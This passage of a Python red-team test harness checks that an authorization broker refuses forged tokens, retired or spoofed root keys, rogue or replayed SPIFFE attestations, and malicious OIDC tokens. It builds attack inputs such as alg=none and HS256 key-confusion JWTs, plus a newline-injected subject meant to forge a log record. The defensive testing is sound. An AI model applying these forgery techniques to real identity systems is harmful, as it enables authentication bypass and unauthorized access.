        report.check("aws: a policy with no resource", False, "BUILT")
    except ValueError as exc:
        report.check("aws: a policy with no resource", True, str(exc))
    intact, _ = stower.audit.verify()
    intact2, _ = atower.audit.verify()
    report.check("tower ssh/aws: every clearance and refusal is on an intact tape", intact and intact2)

    # ---------------------------------------------------------------------
    section("12. The root of trust — a rotated key, a retired key, a lying signer")
    from taper.rootkey import TrustSet as _TS, kid_of as _kid
    old_root = Ed25519PrivateKey.generate()
    new_root = Ed25519PrivateKey.generate()
    during = _TS({_kid(old_root.public_key()): old_root.public_key(),
                  _kid(new_root.public_key()): new_root.public_key()})
    t_old = Token.issue(old_root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    t_new = Token.issue(new_root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    try:
        verify(t_old, during, now=NOW); verify(t_new, during, now=NOW)
        report.check("root: both keys verify during a rotation", True,
                     f"kids {t_old.blocks[0].kid}, {t_new.blocks[0].kid}")
    except ChainError as exc:
        report.check("root: both keys verify during a rotation", False, str(exc))

    after = _TS({_kid(new_root.public_key()): new_root.public_key()})     # retired the old one
    for label, tok in (("a chain signed by a retired root", t_old),
                       ("a child of a chain signed by a retired root",
                        t_old.attenuate(FULL, now=NOW))):
        try:
            verify(tok, after, now=NOW)
            report.check(f"root: {label}", False, "VERIFIED AFTER RETIREMENT")
        except ChainError as exc:
            report.check(f"root: {label}", True, str(exc))

    # a chain that names a trusted kid but was signed by someone else
    forged_root = Ed25519PrivateKey.generate()
    f = Token.issue(forged_root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com")
    fdata = json.loads(_unb64(f.serialize()))
    fdata["b"][0]["kid"] = t_new.blocks[0].kid
    try:
        verify(Token.deserialize(_b64(json.dumps(fdata).encode())), after, now=NOW)
        report.check("root: a chain wearing a trusted kid", False, "VERIFIED")
    except ChainError as exc:
        report.check("root: a chain wearing a trusted kid", True, str(exc))

    # a child block that claims to name a root
    c = t_new.attenuate(FULL, now=NOW)
    cdata = json.loads(_unb64(c.serialize()))
    cdata["b"][1]["kid"] = t_new.blocks[0].kid
    try:
        verify(Token.deserialize(_b64(json.dumps(cdata).encode())), after, now=NOW)
        report.check("root: a child block naming a root key", False, "VERIFIED")
    except ChainError as exc:
        report.check("root: a child block naming a root key", True, str(exc))

    # a signer that answers for a key it does not hold is caught at mint
    try:
        Token.issue(None, FULL, ttl_seconds=3600, now=NOW,
                    signer=forged_root.sign, root_pub=new_root.public_key())
        report.check("root: a signer answering for another key", False, "MINTED")
    except ChainError as exc:
        report.check("root: a signer answering for another key", True, str(exc))

    # an unnamed root against a set of several: no guessing
    legacy = json.loads(_unb64(t_new.serialize())); del legacy["b"][0]["kid"]
    try:
        verify(Token.deserialize(_b64(json.dumps(legacy).encode())), during, now=NOW)
        report.check("root: an unnamed root against a set of several", False, "GUESSED")
    except ChainError as exc:
        report.check("root: an unnamed root against a set of several", True, str(exc))

    # ---------------------------------------------------------------------
    section("13. SPIFFE — the workload a grant was written for, and no other")
    import datetime as _dt
    from cryptography import x509 as _x509
    from cryptography.hazmat.primitives import hashes as _hashes, serialization as _ser
    from cryptography.hazmat.primitives.asymmetric import ec as _ec
    from cryptography.x509.oid import NameOID as _NameOID
    from taper import spiffe as _spiffe

    def _ca(name):
        k = _ec.generate_private_key(_ec.SECP256R1())
        sub = _x509.Name([_x509.NameAttribute(_NameOID.COMMON_NAME, name)])
        at = _dt.datetime.fromtimestamp(NOW, _dt.timezone.utc)
        c = (_x509.CertificateBuilder().subject_name(sub).issuer_name(sub)
             .public_key(k.public_key()).serial_number(_x509.random_serial_number())
             .not_valid_before(at - _dt.timedelta(hours=1))
             .not_valid_after(at + _dt.timedelta(days=1))
             .add_extension(_x509.BasicConstraints(ca=True, path_length=None), critical=True)
             .sign(k, _hashes.SHA256()))
        return k, c

    def _issue(cak, cac, sid, minutes=60):
        k = _ec.generate_private_key(_ec.SECP256R1())
        at = _dt.datetime.fromtimestamp(NOW, _dt.timezone.utc)
        c = (_x509.CertificateBuilder().subject_name(_x509.Name([])).issuer_name(cac.subject)
             .public_key(k.public_key()).serial_number(_x509.random_serial_number())
             .not_valid_before(at - _dt.timedelta(minutes=1))
             .not_valid_after(at + _dt.timedelta(minutes=minutes))
             .add_extension(_x509.BasicConstraints(ca=False, path_length=None), critical=True)
             .add_extension(_x509.SubjectAlternativeName(
                 [_x509.UniformResourceIdentifier(sid)]), critical=True)
             .sign(cak, _hashes.SHA256()))
        return k, c.public_bytes(_ser.Encoding.PEM) + cac.public_bytes(_ser.Encoding.PEM)

    spi_ca_key, spi_ca = _ca("spire-ca")
    rogue_key, rogue_ca = _ca("rogue-ca")
    WL = "spiffe://example.org/agent/build"
    svid_key, svid_chain = _issue(spi_ca_key, spi_ca, WL)
    sbroker = Broker(root_pub=root.public_key(), adapters={"ssh.exec": SSHAdapter()},
                     audit_path=tmp / "spiffe-audit.jsonl", clock=lambda: NOW,
                     spiffe_bundle=[spi_ca])
    wtok = Token.issue(root, FULL, ttl_seconds=3600, now=NOW, subject="alice@example.com",
                       workload="spiffe://example.org/agent/*")
    ww = wtok.serialize()
    sreq2 = {"host": "build-1.internal", "program": "git", "args": ["status"]}

    def ask_workload(label, attestation, expect_allowed=False, wire=ww, tok=wtok):
        d = sbroker.decide(wire, "ssh.exec", sreq2,
                           proof=prove(tok.proving_key(), wire, "ssh.exec", sreq2, now=NOW),
                           attestation=attestation)
        if expect_allowed:
            report.check(f"spiffe: {label}", d.allowed, d.reason if not d.allowed else d.workload)
        else:
            report.check(f"spiffe: {label}", not d.allowed,
                         d.reason if not d.allowed else "ALLOWED")
        return d

    ask_workload("the attested workload is allowed",
                 _spiffe.prove(svid_key, svid_chain, ww, "ssh.exec", sreq2, now=NOW),
                 expect_allowed=True)
    ask_workload("no SVID at all", None)
    rogue_svid_key, rogue_svid_chain = _issue(rogue_key, rogue_ca, WL)
    ask_workload("an SVID from a CA the bundle does not hold",
                 _spiffe.prove(rogue_svid_key, rogue_svid_chain, ww, "ssh.exec",
                               sreq2, now=NOW))
    other_key, other_chain = _issue(spi_ca_key, spi_ca, "spiffe://example.org/other/svc")
    ask_workload("a genuine SVID for a workload outside the pattern",
                 _spiffe.prove(other_key, other_chain, ww, "ssh.exec", sreq2, now=NOW))
    thief_key, _ = _issue(spi_ca_key, spi_ca, "spiffe://example.org/agent/thief")
    ask_workload("the right certificate, signed by a key that is not its own",
                 _spiffe.prove(thief_key, svid_chain, ww, "ssh.exec", sreq2, now=NOW,
                               spiffe_id=WL))
    ask_workload("an attestation made for a different request",
                 _spiffe.prove(svid_key, svid_chain, ww, "ssh.exec",
                               {**sreq2, "args": []}, now=NOW))
    replayed = _spiffe.prove(svid_key, svid_chain, ww, "ssh.exec", sreq2, now=NOW)
    ask_workload("a fresh attestation", replayed, expect_allowed=True)
    ask_workload("the same attestation twice", replayed)
    ask_workload("an attestation whose timestamp is an hour old",
                 _spiffe.prove(svid_key, svid_chain, ww, "ssh.exec", sreq2, now=NOW - 3600))
    expired_key, expired_chain = _issue(spi_ca_key, spi_ca, WL, minutes=-1)
    ask_workload("an expired SVID",
                 _spiffe.prove(expired_key, expired_chain, ww, "ssh.exec", sreq2, now=NOW))
    # a child block that names its own workload, and a rewritten root
    wchild = wtok.attenuate(FULL, now=NOW)
    cdata2 = json.loads(_unb64(wchild.serialize()))
    cdata2["b"][1]["wl"] = "spiffe://example.org/anything/*"
    forged_child = _b64(json.dumps(cdata2).encode())
    d = sbroker.decide(forged_child, "ssh.exec", sreq2, proof=None, attestation=None)
    report.check("spiffe: a child block naming its own workload",
                 not d.allowed and "names a workload" in d.reason, d.reason)
    rdata = json.loads(_unb64(ww)); rdata["b"][0]["wl"] = "spiffe://example.org/anything/*"
    d = sbroker.decide(_b64(json.dumps(rdata).encode()), "ssh.exec", sreq2,
                       proof=None, attestation=None)
    report.check("spiffe: the root's workload rewritten",
                 not d.allowed and "bad signature" in d.reason, d.reason)
    # a broker with no bundle refuses a workload grant rather than ignoring it
    nobundle = Broker(root_pub=root.public_key(), adapters={"ssh.exec": SSHAdapter()},
                      audit_path=tmp / "spiffe-audit.jsonl", clock=lambda: NOW)
    d = nobundle.decide(ww, "ssh.exec", sreq2,
                        proof=prove(wtok.proving_key(), ww, "ssh.exec", sreq2, now=NOW),
                        attestation=_spiffe.prove(svid_key, svid_chain, ww, "ssh.exec",
                                                  sreq2, now=NOW))
    report.check("spiffe: a broker with no trust bundle refuses rather than ignores",
                 not d.allowed and "no SPIFFE trust bundle" in d.reason, d.reason)
    for bad in ("spiffe://example.org/a b", "https://example.org/x", "spiffe:///x",
                "spiffe://example.org//x", "", "spiffe://EXAMPLE.org/x"):
        report.check(f"spiffe: {bad!r} is not a SPIFFE ID", not _spiffe.valid_id(bad))
    intact, _ = sbroker.audit.verify()
    report.check("spiffe: every refusal is on an intact tape", intact)

    # ---------------------------------------------------------------------
    section("14. The identity provider — a login is not a wider grant")
    import base64 as _b64mod
    import hmac as _hmac
    import hashlib as _hashlib
    from cryptography.hazmat.primitives.asymmetric import padding as _padding, rsa as _rsa
    from cryptography.hazmat.primitives import hashes as _h2
    from taper import idp as _idp

    _iss, _aud = "https://login.example.com/", "taper"
    _idp_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
    _other_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)

    def _b64u(raw: bytes) -> str:
        return _b64mod.urlsafe_b64encode(raw).decode().rstrip("=")

    def _jwk(key, kid):
        n = key.public_key().public_numbers()
        def enc(i):
            return _b64u(i.to_bytes((i.bit_length() + 7) // 8, "big"))
        return {"kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256",
                "n": enc(n.n), "e": enc(n.e)}

    def _mint_jwt(key, kid, claims, alg="RS256", sig=None):
        head = _b64u(json.dumps({"alg": alg, "kid": kid, "typ": "JWT"},
                                separators=(",", ":")).encode())
        body = _b64u(json.dumps(claims, separators=(",", ":")).encode())
        si = f"{head}.{body}".encode()
        if sig is not None:
            signature = sig
        elif alg == "none":
            signature = b""
        elif alg.startswith("HS"):
            pub = key.public_key().public_bytes(_ser.Encoding.PEM,
                                                _ser.PublicFormat.SubjectPublicKeyInfo)
            signature = _hmac.new(pub, si, _hashlib.sha256).digest()
        else:
            signature = key.sign(si, _padding.PKCS1v15(), _h2.SHA256())
        return f"{head}.{body}.{_b64u(signature)}"

    def _claims(**kw):
        c = {"iss": _iss, "aud": _aud, "exp": NOW + 300, "iat": NOW - 5,
             "email": "alice@example.com", "groups": ["dev"], "jti": "rt-1"}
        c.update(kw)
        return c

    _idir = tmp / "idp"
    _idir.mkdir(exist_ok=True)
    (_idir / "dev.json").write_text(json.dumps({"capabilities": {}, "note": "dev"}))
    (_idir / "sre.json").write_text(json.dumps({"capabilities": {}, "note": "sre"}))
    _jwks_path = _idir / "idp.jwks.json"
    _jwks_path.write_text(json.dumps({"keys": [_jwk(_idp_key, "k1")]}))
    _map_path = _idir / "idp.json"
    _map_path.write_text(json.dumps({
        "issuer": _iss, "audience": _aud, "subject_claim": "email",
        "groups_claim": "groups", "max_age_days": 7,
        "rules": [{"group": "sre", "policy": str(_idir / "sre.json"), "max_ttl": "8h"},
                  {"group": "dev", "policy": str(_idir / "dev.json"), "max_ttl": "1h"}]}))
    _mapping = _idp.Mapping.load(_map_path)
    _keys = _idp.load_jwks(_jwks_path)
    _seen = _idir / "seen.json"

    def _refused(name, token, seen=None, mapping=None):
        try:
            _idp.authorize(token, mapping or _mapping, _keys, seen or _seen, now=NOW)
            report.check(name, False, "the token was accepted")
        except _idp.IdPError as exc:
            report.check(name, True, str(exc)[:70])

    # the two classic JWT breaks
    _refused("idp: alg=none mints nothing",
             _mint_jwt(_idp_key, "k1", _claims(), alg="none"))
    _refused("idp: HS256 signed with the provider's public key is refused",
             _mint_jwt(_idp_key, "k1", _claims(), alg="HS256"))
    _refused("idp: a token signed by another RSA key is refused",
             _mint_jwt(_other_key, "k1", _claims()))
    _refused("idp: an empty signature on a real algorithm is refused",
             _mint_jwt(_idp_key, "k1", _claims(), sig=b""))
    _refused("idp: a kid not in the pinned set is not tried against every key",
             _mint_jwt(_idp_key, "k9", _claims()))

    # claims that would widen or misdirect
    _refused("idp: another issuer's token is refused",
             _mint_jwt(_idp_key, "k1", _claims(iss="https://evil.example/")))
    _refused("idp: a token minted for another audience is refused",
             _mint_jwt(_idp_key, "k1", _claims(aud="grafana")))
    _refused("idp: an expired token is refused",
             _mint_jwt(_idp_key, "k1", _claims(exp=NOW - 600)))
    _refused("idp: a token dated in the future is refused",
             _mint_jwt(_idp_key, "k1", _claims(iat=NOW + 7200, nbf=NOW + 7200)))
    _refused("idp: a group nobody mapped mints nothing",
             _mint_jwt(_idp_key, "k1", _claims(groups=["wheel", "admin"])))
    _refused("idp: no subject claim is refused rather than minting for nobody",
             _mint_jwt(_idp_key, "k1", _claims(email=None)))
    _refused("idp: a subject with a newline cannot forge a second record line",
             _mint_jwt(_idp_key, "k1", _claims(email="a@b\nrecord: mint")))

    # the group decides the policy, and only the group
    _dev = _idp.authorize(_mint_jwt(_idp_key, "k1", _claims()), _mapping, _keys,
                          _seen, now=NOW)
    report.check("idp: a dev's token maps to the dev policy, not the sre one",
                 _dev.rule.group == "dev" and _dev.rule.policy.name == "dev.json",
                 str(_dev.rule.policy))
    report.check("idp: the ceiling comes with it", _dev.rule.max_ttl == 3600)
    _both = _idp.authorize(_mint_jwt(_idp_key, "k1", _claims(groups=["dev", "sre"],
                                                             jti="rt-2")),
                           _mapping, _keys, _seen, now=NOW)
    report.check("idp: membership in two groups takes the first rule in file order, "
                 "not the widest", _both.rule.group == "sre")

    # one token, one mint
    _once = _mint_jwt(_idp_key, "k1", _claims(jti="rt-3"))
    _idp.authorize(_once, _mapping, _keys, _seen, now=NOW)
    _refused("idp: the same ID token cannot mint twice", _once)
    _nojti = _mint_jwt(_idp_key, "k1", {k: v for k, v in _claims().items() if k != "jti"})
    _idp.authorize(_nojti, _mapping, _keys, _seen, now=NOW)
    _refused("idp: a token with no jti is still spent once, by its hash", _nojti)
    report.check("idp: the seen-file holds no token and no jti",
                 _once not in _seen.read_text() and "rt-3" not in _seen.read_text())
    report.check("idp: the seen-file is 0600",
                 oct(_seen.stat().st_mode & 0o777) == "0o600")

    # the record, and what must not be on it
    _rec = _dev.as_record("deadbeef")
    report.check("idp: the mint record names the issuer, the person and the rule",
                 _rec["record"] == "mint" and _rec["via"] == "oidc"
                 and _rec["issuer"] == _iss and _rec["subject"] == "alice@example.com"
                 and _rec["group"] == "dev")
    report.check("idp: no ID token, and no claim beyond the subject, is on the record",
                 "eyJ" not in json.dumps(_rec) and "groups" not in _rec)

    # the mapping file itself
    for _bad, _why in [
            ({"issuer": "http://login.example.com/", "audience": "taper",
              "rules": [{"group": "d", "policy": "/x"}]}, "an http issuer"),
            ({"issuer": _iss, "audience": "taper", "rules": []}, "an empty rule set"),
            ({"issuer": _iss, "audience": "taper",
              "rules": [{"group": "d", "policy": "/x", "workload": "not-a-spiffe-id"}]},
             "a workload that is not a SPIFFE id"),
            ({"issuer": _iss, "audience": "taper", "admin": True,
              "rules": [{"group": "d", "policy": "/x"}]}, "an unknown key"),
            ({"issuer": _iss, "audience": "taper",
              "rules": [{"group": "d", "policy": "/x", "grant_all": True}]},
             "an unknown key in a rule")]:
        _p = _idir / "bad.json"
        _p.write_text(json.dumps(_bad))
        try:
            _idp.Mapping.load(_p)
            report.check(f"idp: {_why} is refused at load", False, "it loaded")
        except _idp.IdPError as exc:
            report.check(f"idp: {_why} is refused at load", True, str(exc)[:70])

    # a key set that is not one
    _p = _idir / "empty.jwks.json"
    _p.write_text(json.dumps({"keys": [{"kty": "oct", "kid": "k1", "k": "AAAA"}]}))
    try:
        _idp.load_jwks(_p)
        report.check("idp: a symmetric key in the key set is not a signing key", False)
    except _idp.IdPError as exc:
        report.check("idp: a symmetric key in the key set is not a signing key", True,
                     str(exc)[:70])
    report.check("idp: no HMAC or `none` algorithm exists to be selected",
                 "none" not in _idp.ALGORITHMS
                 and not any(a.startswith("HS") for a in _idp.ALGORITHMS))

    # ---------------------------------------------------------------------
    section("8. Audit integrity")
    intact, _ = broker.audit.verify()
    report.check("audit chain intact after the whole run", intact)

    records = list(broker.audit.read())
    denials = sum(1 for r in records if not r["body"]["allowed"])
    report.check("every denial was recorded", denials > 30,
                 f"{denials} denials logged out of {len(records)} records")

    lines = broker.audit.path.read_text().splitlines()
    if len(lines) > 3:
        del lines[2]
        broker.audit.path.write_text("\n".join(lines) + "\n")
        intact_after, index = broker.audit.verify()
        report.check("deleting a record is detected", not intact_after,
                     f"chain breaks at record {index}")


def main() -> int:
    import tempfile

    print(f"{BOLD}Taper red-team validation{OFF}")
    print(f"{DIM}Every case is an attack. All must be refused.{OFF}")

    report = Report()
    with tempfile.TemporaryDirectory() as tmp:
        run(report, Path(tmp))

    total = report.passed + len(report.failed)
    print("\n" + "═" * 72)
    if report.failed:
        print(f"{RED}{BOLD}FAIL{OFF}  {len(report.failed)} of {total} attacks succeeded:")
        for name in report.failed:
            print(f"  {RED}•{OFF} {name}")
        return 1
    print(f"{GREEN}{BOLD}PASS{OFF}  all {total} attacks refused")
    print(f"{DIM}Reminder: this validates the decision layer. Run "
          f"validate/check_postgres.py and{OFF}")
    print(f"{DIM}validate/check_ssh.sh to prove the real boundaries hold "
          f"independently.{OFF}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
